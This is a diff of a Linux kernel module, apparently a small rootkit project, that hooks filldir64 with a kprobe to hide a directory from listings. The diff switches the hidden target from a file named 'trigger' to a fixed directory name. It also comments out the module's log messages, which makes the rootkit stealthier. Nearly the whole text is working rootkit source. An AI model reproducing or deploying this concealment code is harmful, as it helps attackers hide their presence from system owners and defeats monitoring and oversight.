@@ -8,18 +8,18 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor, Nathan, Romanos");
-MODULE_DESCRIPTION("Hook filldir syscall to hide a file with kprobes");
+MODULE_DESCRIPTION("Hook filldir syscall to hide a directory with kprobes");
 MODULE_VERSION("0.01");
 
 static struct kprobe kp;
 
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-    char *filename = (char *)regs->si;
+    char *dir = (char *)regs->si;
     int ret;
-    printk(KERN_INFO "rootkit: filldir64 called with filename: %s\n", filename);
+    // printk(KERN_INFO "rootkit: filldir64 called with dir: %s\n", dir);
 
-    if ((ret = strcmp(filename, "trigger")) == 0) {
+    if ((ret = strcmp(dir, "111111111111111111111111111")) == 0) {
         regs->dx = 0;
     }
     return 0;
@@ -33,7 +33,7 @@ static int __init rootkit_init(void)
 
     ret = register_kprobe(&kp);
     if (ret < 0) {
-        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
+        // printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
         return ret;
     }
 
@@ -43,7 +43,7 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
     unregister_kprobe(&kp);
-    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
+    // printk(KERN_INFO "rootkit: Kprobe unregistered\n");
 }
 
 module_init(rootkit_init);
